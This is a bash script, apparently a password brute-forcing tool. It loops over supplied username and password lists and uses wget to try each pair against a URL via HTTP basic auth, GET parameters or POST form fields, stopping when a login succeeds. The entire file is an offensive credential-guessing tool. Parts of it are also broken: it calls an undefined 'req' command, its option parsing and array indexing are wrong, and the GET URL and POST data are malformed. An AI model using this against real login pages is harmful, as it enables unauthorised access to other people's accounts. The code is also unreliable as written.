#!/bin/bash

req 'wget'

usage="Usage:\t<url> <usernames> <passwords> [ -c <connection-protocol> ] [ -d <delay> ] [ -p(ost) <name> <pass> ] [ -g(et) <name> <pass> ]"
url=
usernames=
passwords=
delay=0
post_or_get_args=
attack_type="http"
protocol="http"

if [ -n "$3" ]; then
	url="$1"
	usernames="$2"
	passwords="$3"
else
	echo -e "$usage"
	exit
fi

while getopts "c:d:p:g:" opt; do
	case $opt in
		c)
			protocol=$OPTARG
			;;
		d)
			delay=$OPTARG
			;;
		p)
			post_or_get_args+="$OPTARG"
			attack_type=post
			;;
		g)
			post_or_get_args+="$OPTARG"
			attack_type=get
			;;
		\?)
			echo "Invalid option: -$OPTARG"
			;;
	esac
done

if [[ $attack_type == "post" || $attack_type == "get" ]]; then
	post_or_get_username=$post_or_get_args[0]
	post_or_get_password=$post_or_get_args[1]
fi

echo "starting Attack on $protocol://$url"

for username in $usernames
do
	for password in $passwords
	do
		case $attack_type in
			http)
				if wget --spider $protocol://$username:$password@$url &>/dev/null; then
					echo -e "\n\"$username\" : \"$password\" worked out\n"
					exit
				fi
				;;
			get)
				if wget $protocol://$url?$post_or_get_username=$username&$post_or_get_password=$password &>/dev/null; then
					echo -e "\n\"$username\" : \"$password\" worked out\n"
					exit
				fi
				;;
			post)
				if wget --post-data "$post_or_get_username=$username;$post_or_get_password=$password" $protocol://$url &>/dev/null; then
					echo -e "\n\"$username\" : \"$password\" worked out\n"
					exit
				fi
				;;
			\?)
				echo "invalid attack type: $attack_type"
				exit
				;;
		esac
		sleep "$delay"
	done
done
echo "didnt work."
